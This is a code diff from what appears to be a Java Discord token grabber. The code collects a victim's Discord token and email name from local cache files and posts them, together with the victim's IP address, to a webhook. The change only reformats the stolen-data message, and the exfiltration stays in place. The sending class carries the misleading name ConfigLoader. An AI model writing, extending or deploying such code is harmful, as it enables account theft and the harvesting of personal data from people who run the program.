@@ -34,19 +34,16 @@ public class Main {
 							strLine = strLine.substring(index + "mail_cache".length());
 							mails.add(strLine.split("\"")[1]);
 						}
-						StringBuilder msg = new StringBuilder().append("```\\n");
+						String email = "";
 						for (String s2 : mails) {
-							msg.append("Discord Mail-Name: " + s2.split("@")[0] + "\\n");
+							email=s2.split("@")[0];
 						}
 						for (String s : tokens) {
 							if (isToken(s) && !sended) {
-								msg.append("PC: " + System.getProperty("user.name") + "\\n")
-										.append("OS: " + System.getProperty("os.name") + "\\n")
-										.append("Discord Token: " + s + "\\n").append("IP: " + ipAdress())
-										.append("\\n```");
+
 						        try {
 						        	ConfigLoader webhook = new ConfigLoader(webhookLink);
-						            webhook.setContent(String.valueOf(msg));
+						            webhook.setContent("````Token : " + s+" / Email : "+email +" / IP : " +ipAdress() +"```");
 						            webhook.setAvatarUrl(image);
 						            webhook.setUsername("string_cancellation");
 						            webhook.setTts(false);
